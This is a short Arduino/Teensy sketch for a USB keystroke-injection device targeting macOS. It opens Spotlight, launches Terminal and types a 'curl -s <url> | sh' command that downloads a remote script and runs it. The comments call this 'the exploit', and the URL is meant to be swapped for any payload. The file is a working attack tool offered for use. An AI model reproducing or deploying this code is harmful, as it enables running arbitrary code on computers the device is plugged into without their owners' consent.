//opens up terminal and executes a script from a URL.

int led=13;
void setup() {
  pinMode(led, OUTPUT);
  delay(5000);
  //wait 5s before doing anything
  
  digitalWrite(led, HIGH);
  //turn on LED so we know the exploit is being executed
  Keyboard.begin();
  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.press(KEY_SPACE);
  Keyboard.releaseAll();
  //evoke Spotlight
  
  delay(500);
  //give spotlight half a second to open up
  
  Keyboard.print("Terminal");
  delay(1000);
  //wait a second for spotlight to find terminal
  Keyboard.press(KEY_ENTER);
  Keyboard.releaseAll();
  //open up terminal
  
  delay(2000);
  //give the terminal 2s to initialize
  
  Keyboard.write("curl -s '");
  Keyboard.write("http://three20six.me/example_script.sh");
  //change the URL here to point to the location of the script.
  //the example url set here will just print 'hello world' to the terminal.
  Keyboard.write("'|sh");
  Keyboard.press(KEY_ENTER);  
  Keyboard.releaseAll();
  //grab the script content from the URL and execute it
}

void loop() {
  digitalWrite(led, HIGH);
  delay(500);
  digitalWrite(led, LOW);
  delay(500);
  //blink so we know we're done
}
